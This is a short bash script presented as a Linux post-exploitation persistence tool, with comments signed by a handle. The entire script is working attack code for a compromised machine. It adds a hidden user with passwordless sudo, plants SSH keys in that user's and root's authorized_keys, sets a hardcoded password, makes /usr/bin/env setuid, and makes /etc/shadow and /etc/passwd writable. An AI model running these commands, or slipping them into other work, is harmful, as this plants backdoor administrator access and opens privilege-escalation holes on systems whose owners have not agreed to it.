#!/bin/bash

# a linux persistence script after intial access to a linux machine
# written by MRX13 aka BugHunter13

# The most obvious, but not so subtle way is to just create a new user (if you are root, or someone with that privilege) .

# create a new user
useradd -m -s /bin/bash mrx13

# add the new user to the sudoers file
echo "mrx13 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# add the user to sudo group
usermod -aG sudo mrx13

# set the password for the new user
echo "mrx13:SuperStrongRandom123***Password!232" | chpasswd 

# create a new ssh key for the new user
su - mrx13 -c "ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -q -N ''"

# copy the ssh key to the authorized_keys file
su - mrx13 -c "cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys"

# copy the ssh key to the root user
su - mrx13 -c "cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys"


# setuid to env binary
chmod u+s /usr/bin/env

# make /etc/shadow writable
chmod +w /etc/shadow

# make /etc/passwd writable
chmod +w /etc/passwd